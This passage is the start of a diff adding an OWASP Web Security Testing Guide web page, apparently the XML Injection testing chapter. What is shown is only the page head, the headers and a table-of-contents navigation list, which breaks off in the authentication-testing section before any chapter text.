@@ -1,0 +1,1444 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WSTG - Latest | OWASP Web Security Testing Guide</title>
+<meta name="description" content="The premier cybersecurity testing resource for web application developers and security professionals.">
+<meta property="og:type" content="website">
+<meta property="og:title" content="WSTG - Latest">
+<meta property="og:description" content="The premier cybersecurity testing resource for web application developers and security professionals.">
+<meta property="og:image" content="https://wstg.owasp.org/assets/images/wstg-cover.png">
+<meta property="og:url" content="https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection/">
+<meta property="og:site_name" content="OWASP Web Security Testing Guide">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="WSTG - Latest">
+<meta name="twitter:description" content="The premier cybersecurity testing resource for web application developers and security professionals.">
+<meta name="twitter:image" content="https://wstg.owasp.org/assets/images/wstg-cover.png">
+<link rel="canonical" href="https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection/">
+<link rel="icon" href="/assets/images/wstg-shield.png" type="image/png">
+<link rel="apple-touch-icon" href="/assets/images/wstg-shield.png">
+<meta name="theme-color" content="#1a1d23">
+<script>
+(function () {
+  var t;
+  try { t = localStorage.getItem('wstg-theme'); } catch (e) {}
+  var effective;
+  if (!t || t === 'system') {
+    effective = window.matchMedia && matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+  } else {
+    effective = t;
+  }
+  document.documentElement.setAttribute('data-theme', effective);
+})();
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Barlow:wght@400;500;600;700&family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/base.css">
+<link rel="stylesheet" href="/assets/css/shell.css">
+<link rel="stylesheet" href="/assets/css/buttons.css">
+<link rel="stylesheet" href="/assets/css/footer.css">
+<link rel="stylesheet" href="/assets/css/site.css">
+
+<link rel="stylesheet" href="/assets/css/wstg-nav.css">
+
+
+</head>
+<body id="top" class="page-document">
+  <div class="skip-links">
+    <a href="#main-content" class="skip-link">Skip to main content</a>
+    <a href="#page-end" class="skip-link">Skip to bottom of page</a>
+  </div>
+  <header class="site-header">
+  <div class="container container-wide header-inner">
+    <div class="header-left">
+      <a href="/" class="header-brand" aria-label="WSTG home">
+        <img class="header-brand-shield" src="/assets/images/wstg-shield.png" width="40" height="40" alt="">
+        <span class="header-brand-name"><span class="wstg-wordmark">WSTG</span></span>
+      </a>
+    </div>
+    <div class="header-actions">
+      <button type="button" id="theme-toggle" class="theme-toggle" aria-label="Theme: system. Click to switch." title="Theme">
+        <span class="theme-toggle-icon-wrap">
+          <svg class="theme-toggle-icon" viewBox="0 0 24 24" width="22" height="22" aria-hidden="true">
+            <path fill="currentColor" d="M12 3a9 9 0 1 0 9 9c0-.46-.04-.92-.1-1.36a5.389 5.389 0 0 1-4.4 2.26 5.403 5.403 0 0 1-3.14-9.8c-.44-.06-.9-.1-1.36-.1z"/>
+          </svg>
+        </span>
+        <span class="theme-toggle-label" aria-hidden="true">Theme</span>
+      </button>
+      <a href="https://owasp.org/" class="ext-link" rel="noopener noreferrer" target="_blank" aria-label="OWASP (external)">
+        <img class="owasp-wordmark-img" src="/assets/images/owasp-logo-header.svg" alt="" width="133" height="40">
+        <span class="sr-only"> (opens in new window)</span>
+      </a>
+    </div>
+  </div>
+</header>
+
+  <header class="project-header">
+  <div class="container container-wide">
+    <div class="project-header-top">
+      <h1 class="project-title">OWASP Web Security Testing Guide</h1>
+      <p class="project-subtitle">Latest</p>
+    </div>
+    
+    <p class="project-tagline">Web application security testing guidance.</p>
+    
+  </div>
+</header>
+
+
+<div class="channel-banners" role="banner">
+  
+  <div class="channel-banner channel-banner--latest">
+    This content represents the latest contributions to the Web Security Testing Guide, and may frequently change.
+  </div>
+  
+
+  
+
+  
+  
+  
+</div>
+
+<main id="main-content" class="site-main">
+  <div class="container container-wide">
+    <div class="doc-nav-bar">
+      <button type="button" id="doc-nav-toggle" class="doc-nav-toggle" aria-controls="doc-sidebar" aria-expanded="false">
+        <span class="doc-nav-toggle-icon" aria-hidden="true"></span>
+        Contents
+      </button>
+    </div>
+    <div class="doc-layout">
+      <div id="doc-nav-backdrop" class="doc-nav-backdrop" hidden></div>
+      <aside id="doc-sidebar" class="doc-sidebar" aria-label="Guide contents">
+        <button type="button" id="doc-nav-close" class="doc-nav-close" aria-label="Close contents">
+          <span aria-hidden="true">&times;</span>
+        </button>
+        
+
+
+<nav class="wstg-nav" id="wstg-nav-latest" aria-label="WSTG Contents">
+  <p class="wstg-nav-home"><a href="/">← Home</a></p>
+  <h2 class="wstg-nav-title"><a href="/latest/">WSTG Contents</a></h2>
+  <label class="visually-hidden" for="wstg-nav-filter-latest">Filter contents</label>
+  <input id="wstg-nav-filter-latest" class="wstg-nav-filter" type="search" placeholder="Filter (XSS, sqli, WSTG-INPV-01, 4.7)" autocomplete="off">
+  <div class="wstg-nav-controls">
+    <button type="button" data-wstg-expand>Expand All</button>
+    <button type="button" data-wstg-collapse>Collapse All</button>
+  </div>
+  <ul class="wstg-nav-list">
+    
+    
+<li class="wstg-nav-item" data-title="0. Foreword">
+<a href="/latest/0-Foreword/" data-nav-url="0-Foreword/" title="0. Foreword">0. Foreword</a>
+</li>
+<li class="wstg-nav-item" data-title="1. About">
+<a href="/latest/1-About/" data-nav-url="1-About/" title="1. About">1. About</a>
+</li>
+<li class="wstg-nav-item" data-title="2. Introduction">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/latest/2-Introduction/" data-nav-url="2-Introduction/" title="2. Introduction">2. Introduction</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="2.1 Purpose and Scope">
+<a href="/latest/2-Introduction/#purpose-and-scope" data-nav-url="2-Introduction/#purpose-and-scope" title="2.1 Purpose and Scope">2.1 Purpose and Scope</a>
+</li>
+<li class="wstg-nav-item" data-title="2.2 Why Web Application Security Testing Matters">
+<a href="/latest/2-Introduction/#why-web-application-security-testing-matters" data-nav-url="2-Introduction/#why-web-application-security-testing-matters" title="2.2 Why Web Application Security Testing Matters">2.2 Why Web Application Security Testing Matters</a>
+</li>
+<li class="wstg-nav-item" data-title="2.3 Who Should Use This Guide">
+<a href="/latest/2-Introduction/#who-should-use-this-guide" data-nav-url="2-Introduction/#who-should-use-this-guide" title="2.3 Who Should Use This Guide">2.3 Who Should Use This Guide</a>
+</li>
+<li class="wstg-nav-item" data-title="2.4 Core Principles of Effective Security Testing">
+<a href="/latest/2-Introduction/#core-principles-of-effective-security-testing" data-nav-url="2-Introduction/#core-principles-of-effective-security-testing" title="2.4 Core Principles of Effective Security Testing">2.4 Core Principles of Effective Security Testing</a>
+</li>
+<li class="wstg-nav-item" data-title="2.5 How the Guide Is Organized">
+<a href="/latest/2-Introduction/#how-the-guide-is-organized" data-nav-url="2-Introduction/#how-the-guide-is-organized" title="2.5 How the Guide Is Organized">2.5 How the Guide Is Organized</a>
+</li>
+<li class="wstg-nav-item" data-title="2.6 How to Reference WSTG Scenarios">
+<a href="/latest/2-Introduction/#how-to-reference-wstg-scenarios" data-nav-url="2-Introduction/#how-to-reference-wstg-scenarios" title="2.6 How to Reference WSTG Scenarios">2.6 How to Reference WSTG Scenarios</a>
+</li>
+<li class="wstg-nav-item" data-title="2.7 Feedback and Comments">
+<a href="/latest/2-Introduction/#feedback-and-comments" data-nav-url="2-Introduction/#feedback-and-comments" title="2.7 Feedback and Comments">2.7 Feedback and Comments</a>
+</li>
+<li class="wstg-nav-item" data-title="2.8 Related OWASP Projects">
+<a href="/latest/2-Introduction/#related-owasp-projects" data-nav-url="2-Introduction/#related-owasp-projects" title="2.8 Related OWASP Projects">2.8 Related OWASP Projects</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="3. The OWASP Testing Framework">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/latest/3-The_OWASP_Testing_Framework/" data-nav-url="3-The_OWASP_Testing_Framework/" title="3. The OWASP Testing Framework">3. The OWASP Testing Framework</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="3.1 The Web Security Testing Framework">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/latest/3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework" data-nav-url="3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework" title="3.1 The Web Security Testing Framework">3.1 The Web Security Testing Framework</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="3.2 Phase 1 Before Development Begins">
+<a href="/latest/3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework#phase-1-before-development-begins" data-nav-url="3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework#phase-1-before-development-begins" title="3.2 Phase 1 Before Development Begins">3.2 Phase 1 Before Development Begins</a>
+</li>
+<li class="wstg-nav-item" data-title="3.3 Phase 2 During Definition and Design">
+<a href="/latest/3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework#phase-2-during-definition-and-design" data-nav-url="3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework#phase-2-during-definition-and-design" title="3.3 Phase 2 During Definition and Design">3.3 Phase 2 During Definition and Design</a>
+</li>
+<li class="wstg-nav-item" data-title="3.4 Phase 3 During Development">
+<a href="/latest/3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework#phase-3-during-development" data-nav-url="3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework#phase-3-during-development" title="3.4 Phase 3 During Development">3.4 Phase 3 During Development</a>
+</li>
+<li class="wstg-nav-item" data-title="3.5 Phase 4 During Deployment">
+<a href="/latest/3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework#phase-4-during-deployment" data-nav-url="3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework#phase-4-during-deployment" title="3.5 Phase 4 During Deployment">3.5 Phase 4 During Deployment</a>
+</li>
+<li class="wstg-nav-item" data-title="3.6 Phase 5 During Maintenance and Operations">
+<a href="/latest/3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework#phase-5-during-maintenance-and-operations" data-nav-url="3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework#phase-5-during-maintenance-and-operations" title="3.6 Phase 5 During Maintenance and Operations">3.6 Phase 5 During Maintenance and Operations</a>
+</li>
+<li class="wstg-nav-item" data-title="3.7 A Typical SDLC Testing Workflow">
+<a href="/latest/3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework#a-typical-sdlc-testing-workflow" data-nav-url="3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework#a-typical-sdlc-testing-workflow" title="3.7 A Typical SDLC Testing Workflow">3.7 A Typical SDLC Testing Workflow</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="3.8 Penetration Testing Methodologies">
+<a href="/latest/3-The_OWASP_Testing_Framework/1-Penetration_Testing_Methodologies" data-nav-url="3-The_OWASP_Testing_Framework/1-Penetration_Testing_Methodologies" title="3.8 Penetration Testing Methodologies">3.8 Penetration Testing Methodologies</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4. Web Application Security Testing">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/latest/4-Web_Application_Security_Testing/" data-nav-url="4-Web_Application_Security_Testing/" title="4. Web Application Security Testing">4. Web Application Security Testing</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.0 Introduction and Objectives">
+<a href="/latest/4-Web_Application_Security_Testing/00-Introduction_and_Objectives/" data-nav-url="4-Web_Application_Security_Testing/00-Introduction_and_Objectives/" title="4.0 Introduction and Objectives">4.0 Introduction and Objectives</a>
+</li>
+<li class="wstg-nav-item" data-title="4.1 Information Gathering">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/latest/4-Web_Application_Security_Testing/01-Information_Gathering/" data-nav-url="4-Web_Application_Security_Testing/01-Information_Gathering/" title="4.1 Information Gathering">4.1 Information Gathering</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.1.1 Conduct Search Engine Reconnaissance for Information Leakage" data-hints="wstg-info-01 info-01">
+<a href="/latest/4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Reconnaissance_for_Information_Leakage" data-nav-url="4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Reconnaissance_for_Information_Leakage" title="4.1.1 Conduct Search Engine Reconnaissance for Information Leakage">4.1.1 Conduct Search Engine Reconnaissance for Information Leakage</a>
+</li>
+<li class="wstg-nav-item" data-title="4.1.2 Fingerprint Web Server" data-hints="wstg-info-02 info-02">
+<a href="/latest/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server" data-nav-url="4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server" title="4.1.2 Fingerprint Web Server">4.1.2 Fingerprint Web Server</a>
+</li>
+<li class="wstg-nav-item" data-title="4.1.3 Review Webserver Metafiles for Information Leakage" data-hints="robots robots.txt sitemap sitemap.xml wstg-info-03 info-03">
+<a href="/latest/4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage" data-nav-url="4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage" title="4.1.3 Review Webserver Metafiles for Information Leakage">4.1.3 Review Webserver Metafiles for Information Leakage</a>
+</li>
+<li class="wstg-nav-item" data-title="4.1.4 Attack Surface Identification" data-hints="wstg-info-04 info-04">
+<a href="/latest/4-Web_Application_Security_Testing/01-Information_Gathering/04-Attack_Surface_Identification" data-nav-url="4-Web_Application_Security_Testing/01-Information_Gathering/04-Attack_Surface_Identification" title="4.1.4 Attack Surface Identification">4.1.4 Attack Surface Identification</a>
+</li>
+<li class="wstg-nav-item" data-title="4.1.5 Review Web Page Content for Information Leakage" data-hints="wstg-info-05 info-05">
+<a href="/latest/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Web_Page_Content_for_Information_Leakage" data-nav-url="4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Web_Page_Content_for_Information_Leakage" title="4.1.5 Review Web Page Content for Information Leakage">4.1.5 Review Web Page Content for Information Leakage</a>
+</li>
+<li class="wstg-nav-item" data-title="4.1.6 Identify Application Entry Points" data-hints="wstg-info-06 info-06">
+<a href="/latest/4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points" data-nav-url="4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points" title="4.1.6 Identify Application Entry Points">4.1.6 Identify Application Entry Points</a>
+</li>
+<li class="wstg-nav-item" data-title="4.1.7 Map Execution Paths Through Application" data-hints="wstg-info-07 info-07">
+<a href="/latest/4-Web_Application_Security_Testing/01-Information_Gathering/07-Map_Execution_Paths_Through_Application" data-nav-url="4-Web_Application_Security_Testing/01-Information_Gathering/07-Map_Execution_Paths_Through_Application" title="4.1.7 Map Execution Paths Through Application">4.1.7 Map Execution Paths Through Application</a>
+</li>
+<li class="wstg-nav-item" data-title="4.1.8 Fingerprint Web Application Framework" data-hints="wstg-info-08 info-08">
+<a href="/latest/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework" data-nav-url="4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework" title="4.1.8 Fingerprint Web Application Framework">4.1.8 Fingerprint Web Application Framework</a>
+</li>
+<li class="wstg-nav-item" data-title="4.1.9 Fingerprint Web Application" data-hints="wstg-info-09 info-09 wstg-info-08 info-08">
+<a href="/latest/4-Web_Application_Security_Testing/01-Information_Gathering/09-Fingerprint_Web_Application" data-nav-url="4-Web_Application_Security_Testing/01-Information_Gathering/09-Fingerprint_Web_Application" title="4.1.9 Fingerprint Web Application">4.1.9 Fingerprint Web Application</a>
+</li>
+<li class="wstg-nav-item" data-title="4.1.10 Map Application Architecture" data-hints="wstg-info-10 info-10">
+<a href="/latest/4-Web_Application_Security_Testing/01-Information_Gathering/10-Map_Application_Architecture" data-nav-url="4-Web_Application_Security_Testing/01-Information_Gathering/10-Map_Application_Architecture" title="4.1.10 Map Application Architecture">4.1.10 Map Application Architecture</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4.2 Configuration and Deployment Management Testing">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/" data-nav-url="4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/" title="4.2 Configuration and Deployment Management Testing">4.2 Configuration and Deployment Management Testing</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.2.1 Test Network Infrastructure Configuration" data-hints="wstg-conf-01 conf-01">
+<a href="/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/01-Test_Network_Infrastructure_Configuration" data-nav-url="4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/01-Test_Network_Infrastructure_Configuration" title="4.2.1 Test Network Infrastructure Configuration">4.2.1 Test Network Infrastructure Configuration</a>
+</li>
+<li class="wstg-nav-item" data-title="4.2.2 Test Application Platform Configuration" data-hints="wstg-conf-02 conf-02">
+<a href="/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Test_Application_Platform_Configuration" data-nav-url="4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Test_Application_Platform_Configuration" title="4.2.2 Test Application Platform Configuration">4.2.2 Test Application Platform Configuration</a>
+</li>
+<li class="wstg-nav-item" data-title="4.2.3 Test File Extensions Handling for Sensitive Information" data-hints="wstg-conf-03 conf-03">
+<a href="/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/03-Test_File_Extensions_Handling_for_Sensitive_Information" data-nav-url="4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/03-Test_File_Extensions_Handling_for_Sensitive_Information" title="4.2.3 Test File Extensions Handling for Sensitive Information">4.2.3 Test File Extensions Handling for Sensitive Information</a>
+</li>
+<li class="wstg-nav-item" data-title="4.2.4 Review Old Backup and Unreferenced Files for Sensitive Information" data-hints="wstg-conf-04 conf-04">
+<a href="/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information" data-nav-url="4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information" title="4.2.4 Review Old Backup and Unreferenced Files for Sensitive Information">4.2.4 Review Old Backup and Unreferenced Files for Sensitive Information</a>
+</li>
+<li class="wstg-nav-item" data-title="4.2.5 Enumerate Infrastructure and Application Admin Interfaces" data-hints="wstg-conf-05 conf-05">
+<a href="/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces" data-nav-url="4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces" title="4.2.5 Enumerate Infrastructure and Application Admin Interfaces">4.2.5 Enumerate Infrastructure and Application Admin Interfaces</a>
+</li>
+<li class="wstg-nav-item" data-title="4.2.6 Test HTTP Methods" data-hints="wstg-conf-06 conf-06">
+<a href="/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods" data-nav-url="4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods" title="4.2.6 Test HTTP Methods">4.2.6 Test HTTP Methods</a>
+</li>
+<li class="wstg-nav-item" data-title="4.2.7 Test HTTP Strict Transport Security" data-hints="hsts headers wstg-conf-07 conf-07">
+<a href="/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security" data-nav-url="4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security" title="4.2.7 Test HTTP Strict Transport Security">4.2.7 Test HTTP Strict Transport Security</a>
+</li>
+<li class="wstg-nav-item" data-title="4.2.8 Test RIA Cross Domain Policy" data-hints="crossdomain.xml clientaccesspolicy wstg-conf-08 conf-08">
+<a href="/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/08-Test_RIA_Cross_Domain_Policy" data-nav-url="4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/08-Test_RIA_Cross_Domain_Policy" title="4.2.8 Test RIA Cross Domain Policy">4.2.8 Test RIA Cross Domain Policy</a>
+</li>
+<li class="wstg-nav-item" data-title="4.2.9 Test File Permission" data-hints="wstg-conf-09 conf-09">
+<a href="/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission" data-nav-url="4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission" title="4.2.9 Test File Permission">4.2.9 Test File Permission</a>
+</li>
+<li class="wstg-nav-item" data-title="4.2.10 Test for Subdomain Takeover" data-hints="wstg-conf-10 conf-10">
+<a href="/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover" data-nav-url="4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover" title="4.2.10 Test for Subdomain Takeover">4.2.10 Test for Subdomain Takeover</a>
+</li>
+<li class="wstg-nav-item" data-title="4.2.11 Test Cloud Storage" data-hints="s3 bucket blob storage wstg-conf-11 conf-11">
+<a href="/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage" data-nav-url="4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage" title="4.2.11 Test Cloud Storage">4.2.11 Test Cloud Storage</a>
+</li>
+<li class="wstg-nav-item" data-title="4.2.12 Test for Content Security Policy" data-hints="csp headers wstg-conf-12 conf-12">
+<a href="/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy" data-nav-url="4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy" title="4.2.12 Test for Content Security Policy">4.2.12 Test for Content Security Policy</a>
+</li>
+<li class="wstg-nav-item" data-title="4.2.13 Test for Path Confusion" data-hints="wstg-conf-13 conf-13">
+<a href="/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/13-Test_for_Path_Confusion" data-nav-url="4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/13-Test_for_Path_Confusion" title="4.2.13 Test for Path Confusion">4.2.13 Test for Path Confusion</a>
+</li>
+<li class="wstg-nav-item" data-title="4.2.14 Test Other HTTP Security Header Misconfigurations" data-hints="headers wstg-conf-14 conf-14">
+<a href="/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/14-Test_Other_HTTP_Security_Header_Misconfigurations" data-nav-url="4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/14-Test_Other_HTTP_Security_Header_Misconfigurations" title="4.2.14 Test Other HTTP Security Header Misconfigurations">4.2.14 Test Other HTTP Security Header Misconfigurations</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4.3 Identity Management Testing">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/" data-nav-url="4-Web_Application_Security_Testing/03-Identity_Management_Testing/" title="4.3 Identity Management Testing">4.3 Identity Management Testing</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.3.1 Test Role Definitions" data-hints="wstg-idnt-01 idnt-01">
+<a href="/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/01-Test_Role_Definitions" data-nav-url="4-Web_Application_Security_Testing/03-Identity_Management_Testing/01-Test_Role_Definitions" title="4.3.1 Test Role Definitions">4.3.1 Test Role Definitions</a>
+</li>
+<li class="wstg-nav-item" data-title="4.3.2 Test User Registration Process" data-hints="wstg-idnt-02 idnt-02">
+<a href="/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/02-Test_User_Registration_Process" data-nav-url="4-Web_Application_Security_Testing/03-Identity_Management_Testing/02-Test_User_Registration_Process" title="4.3.2 Test User Registration Process">4.3.2 Test User Registration Process</a>
+</li>
+<li class="wstg-nav-item" data-title="4.3.3 Test Account Provisioning Process" data-hints="wstg-idnt-03 idnt-03">
+<a href="/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/03-Test_Account_Provisioning_Process" data-nav-url="4-Web_Application_Security_Testing/03-Identity_Management_Testing/03-Test_Account_Provisioning_Process" title="4.3.3 Test Account Provisioning Process">4.3.3 Test Account Provisioning Process</a>
+</li>
+<li class="wstg-nav-item" data-title="4.3.4 Testing for Account Enumeration and Guessable User Account" data-hints="wstg-idnt-04 idnt-04">
+<a href="/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account" data-nav-url="4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account" title="4.3.4 Testing for Account Enumeration and Guessable User Account">4.3.4 Testing for Account Enumeration and Guessable User Account</a>
+</li>
+<li class="wstg-nav-item" data-title="4.3.5 Testing for Weak or Unenforced Username Policy" data-hints="wstg-idnt-05 idnt-05 wstg-idnt-04 idnt-04">
+<a href="/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/05-Testing_for_Weak_or_Unenforced_Username_Policy" data-nav-url="4-Web_Application_Security_Testing/03-Identity_Management_Testing/05-Testing_for_Weak_or_Unenforced_Username_Policy" title="4.3.5 Testing for Weak or Unenforced Username Policy">4.3.5 Testing for Weak or Unenforced Username Policy</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4.4 Authentication Testing">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/" data-nav-url="4-Web_Application_Security_Testing/04-Authentication_Testing/" title="4.4 Authentication Testing">4.4 Authentication Testing</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.4.1 Testing for Credentials Transported over an Encrypted Channel" data-hints="tls ssl https wstg-athn-01 athn-01 wstg-cryp-03 cryp-03">
+<a href="/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/01-Testing_for_Credentials_Transported_over_an_Encrypted_Channel" data-nav-url="4-Web_Application_Security_Testing/04-Authentication_Testing/01-Testing_for_Credentials_Transported_over_an_Encrypted_Channel" title="4.4.1 Testing for Credentials Transported over an Encrypted Channel">4.4.1 Testing for Credentials Transported over an Encrypted Channel</a>
+</li>
+<li class="wstg-nav-item" data-title="4.4.2 Testing for Default Credentials" data-hints="wstg-athn-02 athn-02">
+<a href="/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials" data-nav-url="4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials" title="4.4.2 Testing for Default Credentials">4.4.2 Testing for Default Credentials</a>
+</li>
+<li class="wstg-nav-item" data-title="4.4.3 Testing for Weak Lock Out Mechanism" data-hints="rate limit bruteforce brute force account lockout wstg-athn-03 athn-03">
+<a href="/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism" data-nav-url="4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism" title="4.4.3 Testing for Weak Lock Out Mechanism">4.4.3 Testing for Weak Lock Out Mechanism</a>
+</li>
+<li class="wstg-nav-item" data-title="4.4.4 Testing for Bypassing Authentication Schema" data-hints="wstg-athn-04 athn-04">
+<a href="/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema" data-nav-url="4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema" title="4.4.4 Testing for Bypassing Authentication Schema">4.4.4 Testing for Bypassing Authentication Schema</a>
+</li>
+<li class="wstg-nav-item" data-title="4.4.5 Testing for Vulnerable Remember Password" data-hints="wstg-athn-05 athn-05">
+<a href="/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/05-Testing_for_Vulnerable_Remember_Password" data-nav-url="4-Web_Application_Security_Testing/04-Authentication_Testing/05-Testing_for_Vulnerable_Remember_Password" title="4.4.5 Testing for Vulnerable Remember Password">4.4.5 Testing for Vulnerable Remember Password</a>
+</li>
